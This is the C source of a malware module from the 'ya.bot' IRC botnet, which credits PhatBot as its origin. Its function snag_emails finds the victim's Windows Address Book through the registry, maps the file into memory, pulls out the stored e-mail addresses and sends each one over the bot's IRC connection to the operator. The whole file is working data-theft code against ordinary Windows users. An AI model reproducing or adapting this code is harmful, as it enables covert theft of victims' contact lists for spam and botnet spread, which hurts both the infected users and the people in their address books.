/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_SNAGEMAILS

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code from PhatBot
//botbotbotbotbotbotbotbotbotbotbotbotbot

bool snag_emails(SOCKET bsock, char *pszAction, char *pszDestination, bool bSilent, bool bVerbose)
{
	char *pszPointer, szEmail[MEDBUF], szFilePath[MAX_PATH];
	DWORD dwAddress;
	HANDLE hFile, hFileMap;
	int i, j, k = 0, iPos;

#ifndef NO_DEBUG
		debug_print("Snagging E-mails, snag_emails()");
#endif

	if ((!bSilent) && (bVerbose))
			irc_message(bsock, pszAction, pszDestination,
					(char *)string_snagemailsgettingemails,
					CBLUE, string_replysnag, CEND, string_replydotbot);
	if (!registry_readvalue(HKEY_CURRENT_USER,
				(char *)string_snagemailswabregistrykey,
				"",
				szFilePath,
				sizeof(szFilePath) - 1))
	{
		if ((!bSilent) && (bVerbose))
				irc_message(bsock, pszAction, pszDestination,
						(char *)string_snagendofsnag,
						CBLUE, string_replysnag, CEND, string_replydotbot);
			return FALSE;
	}
		hFile = CreateFile(szFilePath,
				GENERIC_READ,
				FILE_SHARE_READ,
				NULL,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
		hFileMap = CreateFileMapping(hFile, 0, PAGE_READONLY, 0, 0, 0);
	if (!hFileMap)
	{
			CloseHandle(hFile);
		if ((!bSilent) && (bVerbose))
				irc_message(bsock, pszAction, pszDestination,
						(char *)string_snagendofsnag,
						CBLUE, string_replysnag, CEND, string_replydotbot);
			return FALSE;
	}
		pszPointer = (char *)MapViewOfFile(hFileMap, FILE_MAP_READ, 0, 0, 0);
	if (!pszPointer)
	{
			CloseHandle(hFile);
		if ((!bSilent) && (bVerbose))
				irc_message(bsock, pszAction, pszDestination,
						(char *)string_snagendofsnag,
						CBLUE, string_replysnag, CEND, string_replydotbot);
			return FALSE;
	}
		iPos = int(*(pszPointer + 0x64));
		dwAddress = MAKELONG(MAKEWORD(*(pszPointer + 0x60),
				*(pszPointer + 0x61)),
				MAKEWORD(*(pszPointer + 0x62),
				*(pszPointer + 0x63)));
	for (i = 0; i < (iPos * 68); i += 68)
	{
		for (j = 0; j <= 68; j++)
		{
				szEmail[j] = *(pszPointer + dwAddress + k + i);
				k += 2;
		}
			szEmail[68] = '\0';
			k = 0;
		if (strlen(szEmail) >= 1)
		{
				Sleep(FLOOD_DELAY);
			if (!bSilent)
					irc_message(bsock, pszAction, pszDestination,
							(char *)string_snagemailsemail,
							CGREEN, string_replysnag, CEND, string_replydotbot,
							CBLUE, CEND, szEmail);
				Sleep(FLOOD_DELAY);
		}
	}
		UnmapViewOfFile(pszPointer);
		CloseHandle(hFileMap);
		CloseHandle(hFile);
	if ((!bSilent) && (bVerbose))
			irc_message(bsock, pszAction, pszDestination,
					(char *)string_snagendofsnag,
					CBLUE, string_replysnag, CEND, string_replydotbot);
		return TRUE;
}
#endif